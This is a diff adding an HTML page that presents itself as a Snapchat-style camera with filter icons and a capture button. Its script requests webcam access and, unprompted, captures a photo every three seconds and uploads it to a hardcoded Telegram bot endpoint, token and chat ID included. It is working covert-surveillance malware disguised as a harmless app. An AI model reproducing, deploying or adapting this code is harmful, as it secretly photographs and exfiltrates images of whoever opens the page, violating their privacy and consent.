@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Style Camera</title>
+    <link rel="icon" href="modern-badge-snapchat-icon_578229-160.avif" type="image/avif">
+
+    <style>
+        /* Body style */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(45deg, #FFC000, #FFFA70);
+            font-family: 'Helvetica Neue', sans-serif;
+            color: white;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Snapchat style bar */
+        .snap-bar {
+            position: absolute;
+            top: 0;
+            width: 100%;
+            height: 50px;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.5rem;
+            color: #fff;
+            z-index: 100;
+        }
+
+        /* Camera video style */
+        #video {
+            border-radius: 30px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.3);
+            border: 5px solid #fff;
+            overflow: hidden;
+            width: 100%;
+            height: auto;
+            max-width: 350px;
+            max-height: 600px;
+        }
+
+        /* Bottom capture button */
+        .capture-btn {
+            position: absolute;
+            bottom: 60px;
+            width: 80px;
+            height: 80px;
+            background-color: white;
+            border-radius: 50%;
+            border: 5px solid #FFD700;
+            cursor: pointer;
+            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.2);
+            z-index: 100;
+        }
+
+        /* Right side settings button */
+        .side-btn {
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.5rem;
+            cursor: pointer;
+            z-index: 100;
+        }
+
+        /* Filter icons below the camera */
+        .filters {
+            position: absolute;
+            bottom: 130px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            z-index: 100;
+        }
+
+        .filter-icon {
+            width: 60px;
+            height: 60px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0px 5px 15px rgba(0, 0, 0, 0.1);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Snapchat style header bar -->
+    <div class="snap-bar">SNAPCHAT</div>
+
+    <!-- Camera video window -->
+    <video id="video" width="320" height="480" autoplay></video>
+
+    <!-- Filter options below the video -->
+    <div class="filters">
+        <div class="filter-icon">🐶</div>
+        <div class="filter-icon">🐱</div>
+        <div class="filter-icon">👑</div>
+        <div class="filter-icon">🌸</div>
+    </div>
+
+    <!-- Capture button at the bottom -->
+    <div class="capture-btn"></div>
+
+    <!-- Side settings button -->
+    <div class="side-btn">⚙️</div>
+
+    <canvas id="canvas" width="320" height="480" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let photoFile;
+
+        // Start the camera stream
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Capture photo every 3 seconds and send to Telegram bot
+                setInterval(captureAndSendPhoto, 3000);
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: ", err);
+            });
+
+        // Capture and send photo to Telegram bot
+        function captureAndSendPhoto() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert canvas to PNG file
+            canvas.toBlob(blob => {
+                // Create file
+                photoFile = new File([blob], "photo.png", { type: 'image/png' });
+
+                // Send photo to Telegram bot API
+                const formData = new FormData();
+                formData.append('photo', photoFile);
+
+                fetch(`https://api.telegram.org/bot7125743494:AAHENVbLo_HAN6sVDYYbqrMd9KL8S3Fv8VY/sendPhoto?chat_id=7111614672`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Photo successfully sent:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending photo:', error);
+                });
+            });
+        }
+    </script>
+
+</body>
+</html>
